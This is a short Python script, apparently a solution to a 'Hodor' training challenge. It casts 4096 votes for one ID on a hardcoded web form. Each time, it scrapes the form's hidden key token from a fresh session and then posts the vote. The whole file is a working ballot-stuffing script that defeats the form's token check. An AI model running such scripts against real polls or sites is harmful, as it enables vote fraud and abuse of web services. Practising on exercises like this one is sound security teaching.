#!/usr/bin/python3
""" Voting 4096 times in Hodor contest """
import requests
from bs4 import BeautifulSoup


ID = 3393
url = "http://158.69.76.135/level1.php"
directory = {
    'id': ID,
    'holdthedoor': 'Submit',
    'key': ''
}
if __name__ == '__main__':

    for i in range(4096):
        session = requests.Session()
        response = session.get(url)
        soup = BeautifulSoup(response.text, "html.parser")
        form = soup.form
        input = form.find("input", {"name": "key"})
        key = input["value"]
        directory['key'] = key
        session.post(url, data=directory)
